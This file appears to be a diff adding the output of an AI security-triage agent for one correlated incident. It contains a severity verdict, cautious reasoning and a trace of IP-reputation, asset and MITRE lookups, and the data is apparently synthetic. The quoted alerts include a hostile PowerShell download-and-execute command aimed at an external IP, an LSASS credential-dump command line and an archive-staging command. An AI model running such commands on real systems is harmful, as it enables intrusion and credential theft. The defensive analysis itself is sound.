@@ -1,0 +1,289 @@
+{
+  "case": {
+    "case_id": "correlated-case-008",
+    "alert_ids": [
+      "979706ee-a44f-46a0-9a2c-95cdc908f138",
+      "0c2b6e9f-a6c9-4c08-8df0-ca358f4b8cbb",
+      "345f2be0-ac02-4b47-9dba-37c57e10de33",
+      "7fb45e61-ccab-4ccd-937d-9149590ea1c4",
+      "2da49bc5-9d9e-4306-9a3a-f62188add023",
+      "bab1ec94-728a-4b86-aed9-e696edce9498",
+      "14a17c29-d47b-46a0-9bbb-997a726b461a",
+      "26994573-7078-4361-aa77-4e6fdfad560b"
+    ],
+    "source_alert_ids": [
+      "sig-0001",
+      "sig-0004",
+      "edr-9001",
+      "sig-0006",
+      "sig-0007",
+      "edr-9002",
+      "edr-9006",
+      "sig-0009"
+    ],
+    "first_seen": "2026-08-20T14:03:11Z",
+    "last_seen": "2026-08-20T14:20:05Z",
+    "hosts": [
+      "WKS-EU-0231"
+    ],
+    "users": [
+      "jsmith"
+    ],
+    "ips": [
+      "10.20.4.55",
+      "10.20.4.90",
+      "185.220.101.47",
+      "8.8.8.8"
+    ],
+    "file_hashes": [
+      "4c297b0b5335bbc2c80250874ffa625289fc068e001953ac3337951238cd8cba",
+      "8dd4f534079fd335290764501b877417fadf2cecd6b5add90d50a72ef70c50c5",
+      "ef1b08f1882961ffb0dc95be40f2b29f1902758e10cae29ea91a016219247c02"
+    ],
+    "link_reasons": [
+      "shared host 'WKS-EU-0231'",
+      "shared ip '10.20.4.55'",
+      "shared ip '185.220.101.47'",
+      "shared user 'jsmith'"
+    ]
+  },
+  "result": {
+    "case_id": "correlated-case-008",
+    "verdict": {
+      "severity": "critical",
+      "confidence": 88,
+      "evidence_sufficient": true,
+      "mitre_techniques": [
+        "T1059.001",
+        "T1583.002",
+        "T1003.001",
+        "T1053.005"
+      ],
+      "recommended_action": "recommend_escalate_urgent",
+      "reasoning": "This case is an 8-alert chain on WKS-EU-0231 spanning encoded PowerShell execution, DNS activity, SMB lateral movement, scheduled-task persistence, LSASS credential dumping, a PowerShell reverse shell, archive staging, and a large outbound transfer -- consistent with a full intrusion lifecycle on a single host rather than isolated noise. The destination IP 185.220.101.47 is confirmed malicious by both sources: VirusTotal flags it 15/91, and AbuseIPDB reports 100% abuse confidence with 132 reports and Tor-exit status. The affected host is not a routine workstation: asset context confirms it belongs to IT Operations with local admin rights on multiple servers, meaningfully raising the impact of compromise. Overall severity and recommended action are based primarily on the IP reputation, asset criticality, and the coherence of the alert chain itself, not on the MITRE mapping alone: search_mitre returned a confident match (score >= 0.25) for only 4 of the chain's 8 alerts, listed below. The remaining alerts' technique mappings were too weak to cite with confidence (sig-0006 scored only 0.21 for T1070.005 (Network Share Connection Removal); edr-9002 scored only 0.22 for T1134.004 (Parent PID Spoofing); edr-9006 scored only 0.17 for T1027.015 (Compression); sig-0009 scored only 0.12 for T1105 (Ingress Tool Transfer)) -- included here for transparency, not treated as confirmed.",
+      "key_evidence": [
+        "VirusTotal: 15/91 engines flag 185.220.101.47 as malicious",
+        "AbuseIPDB: 100% abuse confidence, 132 reports, confirmed Tor exit node",
+        "Asset context: WKS-EU-0231 has admin rights on multiple servers (IT Operations)",
+        "search_mitre confirmed T1059.001 (PowerShell) for sig-0001, score 0.31",
+        "search_mitre confirmed T1583.002 (DNS Server) for sig-0004, score 0.35",
+        "search_mitre confirmed T1003.001 (LSASS Memory) for edr-9001, score 0.30",
+        "search_mitre confirmed T1053.005 (Scheduled Task) for sig-0007, score 0.40"
+      ]
+    },
+    "trace": [
+      {
+        "iteration": 1,
+        "assistant_text": "This case touches a Tor-exit IP and involves the account's own admin workstation. Checking reputation and asset context first.",
+        "tool_calls": [
+          {
+            "name": "enrich_ip",
+            "input": {
+              "ip": "185.220.101.47"
+            },
+            "result": {
+              "ip": "185.220.101.47",
+              "skipped": false,
+              "sources": [
+                {
+                  "source": "virustotal",
+                  "found": true,
+                  "malicious_votes": 15,
+                  "total_votes": 91,
+                  "country": "DE"
+                },
+                {
+                  "source": "abuseipdb",
+                  "found": true,
+                  "abuse_confidence_score": 100,
+                  "total_reports": 132,
+                  "is_tor": true,
+                  "country": "DE"
+                }
+              ],
+              "source_errors": {},
+              "likely_malicious_heuristic": true
+            }
+          },
+          {
+            "name": "get_asset_context",
+            "input": {
+              "hostname": "WKS-EU-0231"
+            },
+            "result": {
+              "found": true,
+              "hostname": "WKS-EU-0231",
+              "owner": "jsmith",
+              "department": "IT Operations",
+              "asset_type": "workstation",
+              "criticality": "high",
+              "notes": "Has local admin rights on multiple servers and is used for routine domain administration tasks -- compromise of this host has an outsized blast radius compared to a typical end-user workstation."
+            }
+          }
+        ]
+      },
+      {
+        "iteration": 2,
+        "assistant_text": "Confirming a MITRE technique for each alert in the chain before citing any of them.",
+        "tool_calls": [
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "Suspicious PowerShell Encoded Command. PowerShell executed with a base64-encoded command line, a common technique to obscure malicious payloads from casual log review."
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1059.001",
+                  "name": "PowerShell",
+                  "tactics": [
+                    "execution"
+                  ],
+                  "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable a",
+                  "score": 0.3096769895745969
+                }
+              ]
+            }
+          },
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "DNS Query to Known DGA-Pattern Domain. Outbound DNS query observed for a domain matching algorithmically-generated-domain heuristics, associated with C2 beaconing."
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1583.002",
+                  "name": "DNS Server",
+                  "tactics": [
+                    "resource-development"
+                  ],
+                  "description": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS ",
+                  "score": 0.3463677504265016
+                }
+              ]
+            }
+          },
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "Credential Dumping Tool Signature Match. Process behavior consistent with LSASS memory access for credential extraction (Mimikatz-family signature). Process: lsass_dump.exe Command line: lsass_dump.exe --pid 812 --out C:\\Windows\\Temp\\creds.bin"
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1003.001",
+                  "name": "LSASS Memory",
+                  "tactics": [
+                    "credential-access"
+                  ],
+                  "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/t",
+                  "score": 0.2958756331474166
+                }
+              ]
+            }
+          },
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "SMB Lateral Movement Pattern. Host initiated SMB admin-share connections to 6 distinct internal hosts within 2 minutes, a pattern consistent with lateral movement tooling."
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1070.005",
+                  "name": "Network Share Connection Removal",
+                  "tactics": [
+                    "stealth"
+                  ],
+                  "description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the net u",
+                  "score": 0.2132693887768188
+                }
+              ]
+            }
+          },
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "Scheduled Task Created via schtasks.exe. A new scheduled task was created via schtasks.exe with a suspicious binary path referencing a temp directory."
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1053.005",
+                  "name": "Scheduled Task",
+                  "tactics": [
+                    "execution",
+                    "persistence",
+                    "privilege-escalation"
+                  ],
+                  "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Co",
+                  "score": 0.39625733574030997
+                }
+              ]
+            }
+          },
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "Reverse Shell Network Behavior. Outbound connection from an uncommon parent process to an external IP with shell-like bidirectional traffic pattern. Process: powershell.exe Command line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')"
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1134.004",
+                  "name": "Parent PID Spoofing",
+                  "tactics": [
+                    "privilege-escalation",
+                    "stealth"
+                  ],
+                  "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use",
+                  "score": 0.22251372300569333
+                }
+              ]
+            }
+          },
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "Archive Utility Compressing Large Directory. 7z.exe observed compressing a large portion of a user's document directory shortly before a large outbound transfer, consistent with staging for exfiltration. Process: 7z.exe Command line: 7z.exe a -p C:\\Windows\\Temp\\archive.7z C:\\Users\\jsmith\\Documents\\*"
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1027.015",
+                  "name": "Compression",
+                  "tactics": [
+                    "stealth"
+                  ],
+                  "description": "Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https:/",
+                  "score": 0.16629312211812294
+                }
+              ]
+            }
+          },
+          {
+            "name": "search_mitre",
+            "input": {
+              "query": "Large Outbound Data Transfer. Host transferred 2.3 GB to an external IP over a single connection, well above baseline for this asset class."
+            },
+            "result": {
+              "results": [
+                {
+                  "technique_id": "T1105",
+                  "name": "Ingress Tool Transfer",
+                  "tactics": [
+                    "command-and-control"
+                  ],
+                  "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim dev",
+                  "score": 0.12340767168523602
+                }
+              ]
+            }
+          }
+        ]
+      }
+    ],
+    "iterations": 2
+  }
+}
